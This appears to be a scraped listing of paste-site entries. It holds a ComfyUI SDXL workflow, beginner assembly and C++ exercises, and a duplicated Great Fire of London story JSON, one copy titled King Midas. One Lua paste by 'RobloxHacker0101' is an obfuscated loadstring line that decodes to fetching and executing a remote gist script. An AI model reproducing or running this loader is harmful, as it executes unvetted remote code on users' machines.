      ""id"": 51,
      ""type"": ""Reroute"",
      ""pos"": [
        450,
        -250
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 20,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 78
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""IMAGE"",
          ""links"": [
            79
          ]
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 52,
      ""type"": ""Note"",
      ""pos"": [
        1550,
        -400
      ],
      ""size"": {
        ""0"": 350,
        ""1"": 150
      },
      ""flags"": {},
      ""order"": 4,
      ""mode"": 0,
      ""properties"": {
        ""text"": """"
      },
      ""widgets_values"": [
        ""\nSDXL Workflow created by Searge Jul 12, 2023\n\nConnect:\n- top left to right => img2img\n- bottom left to right => create a fresh image\n\nWhen img2img is enabled, the Denoise parameter can be\nlowered to a value below 1.0""
      ],
      ""color"": ""#222"",
      ""bgcolor"": ""#000""
    },
    {
      ""id"": 53,
      ""type"": ""Note"",
      ""pos"": [
        1250,
        1250
      ],
      ""size"": {
        ""0"": 300,
        ""1"": 100
      },
      ""flags"": {},
      ""order"": 5,
      ""mode"": 0,
      ""properties"": {
        ""text"": """"
      },
      ""widgets_values"": [
        ""Changing Denoise below 1.0 only makes sense in\nimg2img mode""
      ],
      ""color"": ""#222"",
      ""bgcolor"": ""#000""
    },
    {
      ""id"": 1,
      ""type"": ""CheckpointLoaderSimple"",
      ""pos"": [
        0,
        100
      ],
      ""size"": {
        ""0"": 385.23138427734375,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 6,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            1
          ],
          ""shape"": 3
        },
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            7
          ],
          ""shape"": 3
        },
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": [
            3
          ],
          ""shape"": 3
        }
      ],
      ""title"": ""Load BASE Checkpoint"",
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        ""sd_xl_base_0.9.safetensors""
      ]
    },
    {
      ""id"": 45,
      ""type"": ""Reroute"",
      ""pos"": [
        2650,
        100
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 42,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 68,
          ""pos"": [
            37.5,
            0
          ]
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""IMAGE"",
          ""links"": [
            69,
            83
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": true
      }
    },
    {
      ""id"": 55,
      ""type"": ""Reroute"",
      ""pos"": [
        428,
        1031
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 44,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 83,
          ""pos"": [
            37.5,
            0
          ]
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""IMAGE"",
          ""links"": [
            84
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": true
      }
    },
    {
      ""id"": 54,
      ""type"": ""SaveImage"",
      ""pos"": [
        650,
        1250
      ],
      ""size"": {
        ""0"": 350,
        ""1"": 400
      },
      ""flags"": {},
      ""order"": 46,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""images"",
          ""type"": ""IMAGE"",
          ""link"": 84
        }
      ],
      ""properties"": {},
      ""widgets_values"": [
        ""SeargeSDXL""
      ]
    },
    {
      ""id"": 28,
      ""type"": ""Reroute"",
      ""pos"": [
        1600,
        -200
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 39,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 74
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""LATENT"",
          ""links"": [],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 50,
      ""type"": ""LoadImage"",
      ""pos"": [
        0,
        -600
      ],
      ""size"": {
        ""0"": 400,
        ""1"": 500
      },
      ""flags"": {},
      ""order"": 7,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            78
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""MASK"",
          ""type"": ""MASK"",
          ""links"": null,
          ""shape"": 3
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        ""example.png"",
        ""image""
      ]
    },
    {
      ""id"": 10,
      ""type"": ""CLIPTextEncodeSDXLRefiner"",
      ""pos"": [
        807,
        1036
      ],
      ""size"": {
        ""0"": 226.92648315429688,
        ""1"": 118
      },
      ""flags"": {},
      ""order"": 29,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 23
        },
        {
          ""name"": ""text"",
          ""type"": ""STRING"",
          ""link"": 22,
          ""widget"": {
            ""name"": ""text"",
            ""config"": [
              ""STRING"",
              {
                ""multiline"": true
              }
            ]
          }
        },
        {
          ""name"": ""width"",
          ""type"": ""INT"",
          ""link"": 62,
          ""widget"": {
            ""name"": ""width"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        },
        {
          ""name"": ""height"",
          ""type"": ""INT"",
          ""link"": 63,
          ""widget"": {
            ""name"": ""height"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            44
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        2.5,
        2048,
        2048,
        """"
      ],
      ""color"": ""#322"",
      ""bgcolor"": ""#533""
    },
    {
      ""id"": 26,
      ""type"": ""Reroute"",
      ""pos"": [
        1750,
        -150
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 32,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 86,
          ""slot_index"": 0
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""LATENT"",
          ""links"": [
            34
          ]
        }
      ],
      ""title"": ""Input"",
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 27,
      ""type"": ""Reroute"",
      ""pos"": [
        1600,
        -100
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 25,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 71
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""LATENT"",
          ""links"": [
            86
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 38,
      ""type"": ""PrimitiveNode"",
      ""pos"": [
        1250,
        1050
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 82
      },
      ""flags"": {},
      ""order"": 8,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""FLOAT"",
          ""type"": ""FLOAT"",
          ""links"": [
            50
          ],
          ""widget"": {
            ""name"": ""denoise"",
            ""config"": [
              ""FLOAT"",
              {
                ""default"": 1,
                ""min"": 0,
                ""max"": 1,
                ""step"": 0.01
              }
            ]
          }
        }
      ],
      ""title"": ""Denoise"",
      ""properties"": {},
      ""widgets_values"": [
        1,
        ""fixed""
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 19,
      ""type"": ""SeargePromptText"",
      ""pos"": [
        0,
        450
      ],
      ""size"": {
        ""0"": 403,
        ""1"": 146
      },
      ""flags"": {},
      ""order"": 9,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""STRING"",
          ""type"": ""STRING"",
          ""links"": [
            14
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""title"": ""Main Prompt"",
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        ""woman psychic beauty photo 4K portrait in the style of \""Strange days\"" movie and Cyberpunk2077 videogame, high definition smokey dark music club alley, red and blue police car lights on the walls, dramatic toned mapping, cinematic lighting, insanely detailed texture, sharp focus, photo hyper realism""
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 37,
      ""type"": ""PrimitiveNode"",
      ""pos"": [
        1250,
        900
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 82
      },
      ""flags"": {},
      ""order"": 10,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""FLOAT"",
          ""type"": ""FLOAT"",
          ""links"": [
            49
          ],
          ""widget"": {
            ""name"": ""base_ratio"",
            ""config"": [
              ""FLOAT"",
              {
                ""default"": 0.8,
                ""min"": 0,
                ""max"": 1,
                ""step"": 0.01
              }
            ]
          }
        }
      ],
      ""title"": ""Base vs. Refiner Ratio"",
      ""properties"": {},
      ""widgets_values"": [
        0.9000000000000001,
        ""fixed""
      ],
      ""color"": ""#2a363b"",
      ""bgcolor"": ""#3f5159""
    },
    {
      ""id"": 44,
      ""type"": ""PreviewImage"",
      ""pos"": [
        1897,
        503
      ],
      ""size"": {
        ""0"": 1050,
        ""1"": 1100
      },
      ""flags"": {},
      ""order"": 45,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""images"",
          ""type"": ""IMAGE"",
          ""link"": 70
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      }
    },
    {
      ""id"": 3,
      ""type"": ""CheckpointLoaderSimple"",
      ""pos"": [
        0,
        250
      ],
      ""size"": {
        ""0"": 385.23138427734375,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 11,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            4
          ],
          ""shape"": 3
        },
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            5
          ],
          ""shape"": 3
        },
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": [
            6
          ],
          ""shape"": 3
        }
      ],
      ""title"": ""Load REFINER Checkpoint"",
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        ""sd_xl_refiner_0.9.safetensors""
      ]
    },
    {
      ""id"": 36,
      ""type"": ""PrimitiveNode"",
      ""pos"": [
        1250,
        750
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 82
      },
      ""flags"": {},
      ""order"": 12,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""FLOAT"",
          ""type"": ""FLOAT"",
          ""links"": [
            48
          ],
          ""widget"": {
            ""name"": ""cfg"",
            ""config"": [
              ""FLOAT"",
              {
                ""default"": 8,
                ""min"": 0,
                ""max"": 100
              }
            ]
          }
        }
      ],
      ""title"": ""CFG Scale"",
      ""properties"": {},
      ""widgets_values"": [
        5,
        ""fixed""
      ],
      ""color"": ""#332922"",
      ""bgcolor"": ""#593930""
    },
    {
      ""id"": 34,
      ""type"": ""PrimitiveNode"",
      ""pos"": [
        1250,
        600
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 82
      },
      ""flags"": {},
      ""order"": 13,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""INT"",
          ""type"": ""INT"",
          ""links"": [
            46
          ],
          ""widget"": {
            ""name"": ""steps"",
            ""config"": [
              ""INT"",
              {
                ""default"": 30,
                ""min"": 1,
                ""max"": 10000
              }
            ]
          }
        }
      ],
      ""title"": ""Steps"",
      ""properties"": {},
      ""widgets_values"": [
        150,
        ""fixed""
      ],
      ""color"": ""#432"",
      ""bgcolor"": ""#653""
    },
    {
      ""id"": 47,
      ""type"": ""EmptyLatentImage"",
      ""pos"": [
        1200,
        -100
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 106
      },
      ""flags"": {},
      ""order"": 14,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            71
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        1024,
        1536,
        1
      ]
    },
    {
      ""id"": 18,
      ""type"": ""SeargeSDXLSampler"",
      ""pos"": [
        1900,
        50
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 346
      },
      ""flags"": {},
      ""order"": 40,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""base_model"",
          ""type"": ""MODEL"",
          ""link"": 33
        },
        {
          ""name"": ""base_positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 39
        },
        {
          ""name"": ""base_negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 43
        },
        {
          ""name"": ""refiner_model"",
          ""type"": ""MODEL"",
          ""link"": 32
        },
        {
          ""name"": ""refiner_positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 41
        },
        {
          ""name"": ""refiner_negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 45
        },
        {
          ""name"": ""latent_image"",
          ""type"": ""LATENT"",
          ""link"": 34,
          ""slot_index"": 6
        },
        {
          ""name"": ""noise_seed"",
          ""type"": ""INT"",
          ""link"": 37,
          ""widget"": {
            ""name"": ""noise_seed"",
            ""config"": [
              ""INT"",
              {
                ""default"": 0,
                ""min"": 0,
                ""max"": 18446744073709552000
              }
            ]
          },
          ""slot_index"": 7
        },
        {
          ""name"": ""steps"",
          ""type"": ""INT"",
          ""link"": 46,
          ""widget"": {
            ""name"": ""steps"",
            ""config"": [
              ""INT"",
              {
                ""default"": 30,
                ""min"": 1,
                ""max"": 10000
              }
            ]
          },
          ""slot_index"": 8
        },
        {
          ""name"": ""cfg"",
          ""type"": ""FLOAT"",
          ""link"": 48,
          ""widget"": {
            ""name"": ""cfg"",
            ""config"": [
              ""FLOAT"",
              {
                ""default"": 8,
                ""min"": 0,
                ""max"": 100
              }
            ]
          },
          ""slot_index"": 9
        },
        {
          ""name"": ""base_ratio"",
          ""type"": ""FLOAT"",
          ""link"": 49,
          ""widget"": {
            ""name"": ""base_ratio"",
            ""config"": [
              ""FLOAT"",
              {
                ""default"": 0.8,
                ""min"": 0,
                ""max"": 1,
                ""step"": 0.01
              }
            ]
          },
          ""slot_index"": 10
        },
        {
          ""name"": ""denoise"",
          ""type"": ""FLOAT"",
          ""link"": 50,
          ""widget"": {
            ""name"": ""denoise"",
            ""config"": [
              ""FLOAT"",
              {
                ""default"": 1,
                ""min"": 0,
                ""max"": 1,
                ""step"": 0.01
              }
            ]
          },
          ""slot_index"": 11
        }
      ],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            66
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        692555331076133,
        ""fixed"",
        150,
        5,
        ""euler"",
        ""karras"",
        0.9000000000000001,
        1
      ]
    },
    {
      ""id"": 29,
      ""type"": ""PrimitiveNode"",
      ""pos"": [
        1250,
        450
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 82
      },
      ""flags"": {},
      ""order"": 15,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""INT"",
          ""type"": ""INT"",
          ""links"": [
            37
          ],
          ""widget"": {
            ""name"": ""noise_seed"",
            ""config"": [
              ""INT"",
              {
                ""default"": 0,
                ""min"": 0,
                ""max"": 18446744073709552000
              }
            ]
          }
        }
      ],
      ""title"": ""SEED"",
      ""properties"": {},
      ""widgets_values"": [
        692555331076133,
        ""fixed""
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    }
  ],
  ""links"": [
    [
      1,
      1,
      0,
      4,
      0,
      ""*""
    ],
    [
      3,
      1,
      2,
      6,
      0,
      ""*""
    ],
    [
      4,
      3,
      0,
      7,
      0,
      ""*""
    ],
    [
      5,
      3,
      1,
      8,
      0,
      ""*""
    ],
    [
      6,
      3,
      2,
      9,
      0,
      ""*""
    ],
    [
      7,
      1,
      1,
      5,
      0,
      ""*""
    ],
    [
      14,
      19,
      0,
      23,
      0,
      ""*""
    ],
    [
      16,
      22,
      0,
      25,
      0,
      ""*""
    ],
    [
      17,
      23,
      0,
      11,
      1,
      ""STRING""
    ],
    [
      19,
      23,
      0,
      12,
      1,
      ""STRING""
    ],
    [
      20,
      25,
      0,
      13,
      1,
      ""STRING""
    ],
    [
      21,
      25,
      0,
      13,
      2,
      ""STRING""
    ],
    [
      22,
      25,
      0,
      10,
      1,
      ""STRING""
    ],
    [
      23,
      8,
      0,
      10,
      0,
      ""CLIP""
    ],
    [
      25,
      8,
      0,
      12,
      0,
      ""CLIP""
    ],
    [
      26,
      5,
      0,
      13,
      0,
      ""CLIP""
    ],
    [
      27,
      5,
      0,
      11,
      0,
      ""CLIP""
    ],
    [
      32,
      7,
      0,
      18,
      3,
      ""MODEL""
    ],
    [
      33,
      4,
      0,
      18,
      0,
      ""MODEL""
    ],
    [
      34,
      26,
      0,
      18,
      6,
      ""LATENT""
    ],
    [
      37,
      29,
      0,
      18,
      7,
      ""INT""
    ],
    [
      38,
      11,
      0,
      30,
      0,
      ""*""
    ],
    [
      39,
      30,
      0,
      18,
      1,
      ""CONDITIONING""
    ],
    [
      40,
      12,
      0,
      31,
      0,
      ""*""
    ],
    [
      41,
      31,
      0,
      18,
      4,
      ""CONDITIONING""
    ],
    [
      42,
      13,
      0,
      32,
      0,
      ""*""
    ],
    [
      43,
      32,
      0,
      18,
      2,
      ""CONDITIONING""
    ],
    [
      44,
      10,
      0,
      33,
      0,
      ""*""
    ],
    [
      45,
      33,
      0,
      18,
      5,
      ""CONDITIONING""
    ],
    [
      46,
      34,
      0,
      18,
      8,
      ""INT""
    ],
    [
      48,
      36,
      0,
      18,
      9,
      ""FLOAT""
    ],
    [
      49,
      37,
      0,
      18,
      10,
      ""FLOAT""
    ],
    [
      50,
      38,
      0,
      18,
      11,
      ""FLOAT""
    ],
    [
      51,
      39,
      0,
      11,
      3,
      ""INT""
    ],
    [
      52,
      40,
      0,
      12,
      2,
      ""INT""
    ],
    [
      53,
      39,
      0,
      11,
      4,
      ""INT""
    ],
    [
      54,
      39,
      0,
      11,
      5,
      ""INT""
    ],
    [
      55,
      39,
      0,
      11,
      6,
      ""INT""
    ],
    [
      57,
      39,
      0,
      13,
      4,
      ""INT""
    ],
    [
      58,
      39,
      0,
      13,
      3,
      ""INT""
    ],
    [
      59,
      39,
      0,
      13,
      5,
      ""INT""
    ],
    [
      60,
      39,
      0,
      13,
      6,
      ""INT""
    ],
    [
      61,
      40,
      0,
      12,
      3,
      ""INT""
    ],
    [
      62,
      40,
      0,
      10,
      2,
      ""INT""
    ],
    [
      63,
      40,
      0,
      10,
      3,
      ""INT""
    ],
    [
      64,
      9,
      0,
      41,
      0,
      ""*""
    ],
    [
      65,
      41,
      0,
      42,
      0,
      ""*""
    ],
    [
      66,
      18,
      0,
      43,
      0,
      ""LATENT""
    ],
    [
      67,
      42,
      0,
      43,
      1,
      ""VAE""
    ],
    [
      68,
      43,
      0,
      45,
      0,
      ""*""
    ],
    [
      69,
      45,
      0,
      46,
      0,
      ""*""
    ],
    [
      70,
      46,
      0,
      44,
      0,
      ""IMAGE""
    ],
    [
      71,
      47,
      0,
      27,
      0,
      ""*""
    ],
    [
      73,
      21,
      0,
      11,
      2,
      ""STRING""
    ],
    [
      74,
      48,
      0,
      28,
      0,
      ""*""
    ],
    [
      75,
      6,
      0,
      49,
      0,
      ""*""
    ],
    [
      76,
      49,
      0,
      48,
      1,
      ""VAE""
    ],
    [
      78,
      50,
      0,
      51,
      0,
      ""*""
    ],
    [
      79,
      51,
      0,
      48,
      0,
      ""IMAGE""
    ],
    [
      83,
      45,
      0,
      55,
      0,
      ""*""
    ],
    [
      84,
      55,
      0,
      54,
      0,
      ""IMAGE""
    ],
    [
      86,
      27,
      0,
      26,
      0,
      ""*""
    ]
  ],
  ""groups"": [
    {
      ""title"": ""Load SDXL Checkpoints"",
      ""bounding"": [
        -20,
        0,
        440,
        358
      ],
      ""color"": ""#8A8""
    },
    {
      ""title"": ""Prompts"",
      ""bounding"": [
        -21,
        375,
        441,
        643
      ],
      ""color"": ""#3f789e""
    },
    {
      ""title"": ""CLIP Text Encoding"",
      ""bounding"": [
        793,
        255,
        259,
        919
      ],
      ""color"": ""#b58b2a""
    },
    {
      ""title"": ""Generation Parameters"",
      ""bounding"": [
        1232,
        371,
        340,
        802
      ],
      ""color"": ""#444""
    }
  ],
  ""config"": {},
  ""extra"": {},
  ""version"": 0.4
}"
MWMarnLu,Untitled,Farhana_Zaman,6502 Kick Assembler,Thursday 13th of July 2023 10:17:34 AM CDT,".model small  
.data
    w dw 1,2,3,1,1
        
.code
    main proc
        mov ax, @data
        mov ds,ax
        
        
        xor ax,ax 
        xor bx,bx 
        mov cx,5 
        
                     
        addnos: 
            add ax,w[bx]            
            add bx,2 
            
            loop addnos
        
         
        mov dx,ax
        add dx,48        
        mov ah,2
        int 21h     
            
        
        main endp
    end"
EdjDx2WE,Untitled,Farhana_Zaman,6502 Kick Assembler,Thursday 13th of July 2023 10:15:18 AM CDT,"; example 10.4
; reverse print of array

.model small  
.data
    w dw 1,2,3,4,5
        
.code
    main proc
        mov ax, @data
        mov ds,ax  
        
        lea si,w
        mov cx,5     
                     
        lop1:
            mov dx,[si]
            add dx,48
            mov ah,2
            int 21h 
                
            add si,2
            loop lop1 
        
        ;newline
        mov ah,2
        mov dl,0ah
        int 21h
        
        lea si,w+8
        mov cx,5              
                     
        lop2:
            mov dx,[si]
            add dx,48
            mov ah,2
            int 21h 
                
            sub si,2
            loop lop2
        
        main endp
    end"
d5mpzDEn,Untitled,Farhana_Zaman,6502 Kick Assembler,Thursday 13th of July 2023 10:05:38 AM CDT,"model small  
.data
    w dw 1,2,3,1,1
        
.code
    main proc
        
        mov ax,@data
        mov ds,ax
        
        xor ax,ax 
        lea si,w
        mov cx,5
        
        addnos:
        add ax,[si]
        add si,2
        
        loop addnos
        
        mov dx,ax
        add dx,48
        mov ah,2
        int 21h
        
        main endp
    end main"
6N5XMtHK,Урок 4,kutuzzzov,C++,Thursday 13th of July 2023 09:36:41 AM CDT,"#include <iostream>
#include <string_view>
#include <string>

using namespace std;


// clang-format off

const int NUM_PLANETS = 8;
const string_view PLANETS[] = {
    ""Mercury""sv, ""Venus""sv, ""Earth""sv,
    ""Mars""sv, ""Jupiter""sv, ""Saturn""sv,
    ""Uranus""sv, ""Neptune""sv,
};

// clang-format on

bool IsPlanet(string_view name) {
    for (int i = 0; i < NUM_PLANETS; ++i) {
        if (PLANETS[i] == name) {
            return true;
        }
    }
    return false;
}

void Test(string_view name) {
    cout << name << "" is "" << (IsPlanet(name) ? """"sv : ""NOT ""sv)
        << ""a planet""sv << endl;
}

int main() {
    string name;
    getline(cin, name);
    Test(name);
}"
m1gRtucU,FZero,RobloxHacker0101,Lua,Thursday 13th of July 2023 09:23:12 AM CDT,"loadstring(""\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\118\113\110\97\47\101\50\51\98\97\97\100\55\50\53\57\100\48\53\54\102\52\52\48\48\49\50\53\57\53\51\56\56\53\50\99\98\47\114\97\119\47\98\48\97\57\50\99\48\53\48\56\56\52\99\97\97\100\48\102\48\101\49\102\102\101\55\55\100\54\54\98\99\50\54\99\100\52\50\52\101\52\47\110\104\102\106\111\115\100\104\102\105\111\115\100\102\104\105\111\115\100\104\105\111\103\115\100\102\104\105\111\100\102\115\46\108\117\97\34\41\41\40\41\10"")()"
GfZwUqkH,Untitled,Farhana_Zaman,6502 Kick Assembler,Thursday 13th of July 2023 09:22:43 AM CDT,".model small
.data
w dw 1,2,3,4,5
.code
main proc
    mov ax, @data
    mov ds,ax
    
    mov ax,w
    xchg w+8,ax
    mov w,ax
    
    lea si,w
    mov cx,5
    
    l1:
    mov dx,[si]
    add dx,48
    mov ah,2
    int 21h
    
    add si,2
    loop l1
    
    main endp
end main"
JYS1thu7,The Legend of King Midas,AhmadXploit,Dart,Thursday 13th of July 2023 09:10:25 AM CDT,"[
  {
	""imgUrl"": ""https://via.placeholder.com/600/771796"",
    ""name"": ""The Legend of King Midas"",
	""author"": ""Anonymous"",
	""score"": ""2.13"",
	""review"": ""107.3"",
	""view"": ""2.7"",
    ""desc"": ""   In the year 1666, the vibrant city of London stood as a bustling hub of trade, culture, and innovation. However, a calamity was about to strike—a catastrophe that would forever be etched in the annals of history as the Great Fire of London. The story begins on the night of September 2nd in a small bakery on Pudding Lane, where the fire is said to have originated. A single spark ignited a stack of firewood, and before long, the flames engulfed the building. The narrow streets, densely packed with timber-framed houses and shops, provided ample fuel for the fire to spread rapidly. As the fire grew in intensity, panic gripped the city's inhabitants. The fire brigade, ill-equipped and unprepared for such a calamity, struggled to contain the inferno. The blaze raged on for days, fueled by strong winds and the city's wooden structures.\n   The fire devoured landmark buildings, including St. Paul's Cathedral, with its magnificent spire collapsing into the flames. The once-grand London Bridge, lined with shops and houses, became a fiery spectacle, with burning debris falling into the River Thames. Panic-stricken residents fled their homes, desperately seeking safety from the relentless onslaught. Amid the chaos, one man emerged as a symbol of resilience and leadership—Sir Thomas Bloodworth, the Lord Mayor of London. Unfortunately, his indecisiveness and lack of urgency exacerbated the crisis, as he failed to take immediate action to contain the fire. His infamous quote, 'Pish! A woman might piss it out,' has come to epitomize his incompetence during the catastrophe. The tide began to turn when King Charles II himself intervened, ordering the demolition of buildings to create firebreaks and halt the fire's progress. Despite the destruction, the Great Fire of London did have one unexpected positive consequence—it acted as a cleansing force, wiping out much of the city's unsanitary conditions and paving the way for its subsequent reconstruction.\n   As the flames subsided, the city lay in ruins. Approximately 87 churches, 13,200 houses, and countless other buildings had been reduced to ashes. The human toll, fortunately, was relatively low, with only a handful of reported deaths. However, the psychological impact on the city's residents was profound, as they faced the daunting task of rebuilding their lives and their beloved city. In the aftermath of the fire, a remarkable transformation took place. The renowned architect Sir Christopher Wren was appointed to oversee the city's reconstruction. He embarked on a grand vision, designing numerous churches, including the magnificent St. Paul's Cathedral that still graces the London skyline today. Stricter building codes were enacted, mandating the use of brick and stone rather than timber, which significantly reduced the risk of future fires. Wider streets and squares were planned, improving sanitation and creating a more orderly cityscape.""
  }
]"
znXWaJqx,The Great Fire of London,AhmadXploit,Dart,Thursday 13th of July 2023 09:05:02 AM CDT,"[
  {
	""imgUrl"": ""https://via.placeholder.com/600/771796"",
    ""name"": ""The Great Fire of London"",
	""author"": ""Anonymous"",
	""score"": ""2.13"",
	""review"": ""107.3"",
	""view"": ""2.7"",
    ""desc"": ""   In the year 1666, the vibrant city of London stood as a bustling hub of trade, culture, and innovation. However, a calamity was about to strike—a catastrophe that would forever be etched in the annals of history as the Great Fire of London. The story begins on the night of September 2nd in a small bakery on Pudding Lane, where the fire is said to have originated. A single spark ignited a stack of firewood, and before long, the flames engulfed the building. The narrow streets, densely packed with timber-framed houses and shops, provided ample fuel for the fire to spread rapidly. As the fire grew in intensity, panic gripped the city's inhabitants. The fire brigade, ill-equipped and unprepared for such a calamity, struggled to contain the inferno. The blaze raged on for days, fueled by strong winds and the city's wooden structures.\n   The fire devoured landmark buildings, including St. Paul's Cathedral, with its magnificent spire collapsing into the flames. The once-grand London Bridge, lined with shops and houses, became a fiery spectacle, with burning debris falling into the River Thames. Panic-stricken residents fled their homes, desperately seeking safety from the relentless onslaught. Amid the chaos, one man emerged as a symbol of resilience and leadership—Sir Thomas Bloodworth, the Lord Mayor of London. Unfortunately, his indecisiveness and lack of urgency exacerbated the crisis, as he failed to take immediate action to contain the fire. His infamous quote, 'Pish! A woman might piss it out,' has come to epitomize his incompetence during the catastrophe. The tide began to turn when King Charles II himself intervened, ordering the demolition of buildings to create firebreaks and halt the fire's progress. Despite the destruction, the Great Fire of London did have one unexpected positive consequence—it acted as a cleansing force, wiping out much of the city's unsanitary conditions and paving the way for its subsequent reconstruction.\n   As the flames subsided, the city lay in ruins. Approximately 87 churches, 13,200 houses, and countless other buildings had been reduced to ashes. The human toll, fortunately, was relatively low, with only a handful of reported deaths. However, the psychological impact on the city's residents was profound, as they faced the daunting task of rebuilding their lives and their beloved city. In the aftermath of the fire, a remarkable transformation took place. The renowned architect Sir Christopher Wren was appointed to oversee the city's reconstruction. He embarked on a grand vision, designing numerous churches, including the magnificent St. Paul's Cathedral that still graces the London skyline today. Stricter building codes were enacted, mandating the use of brick and stone rather than timber, which significantly reduced the risk of future fires. Wider streets and squares were planned, improving sanitation and creating a more orderly cityscape.""
  }
]"
sG4bDWVP,loader,RobloxHacker0101,Lua,Thursday 13th of July 2023 08:50:13 AM CDT,"--// bros using http spy to see this


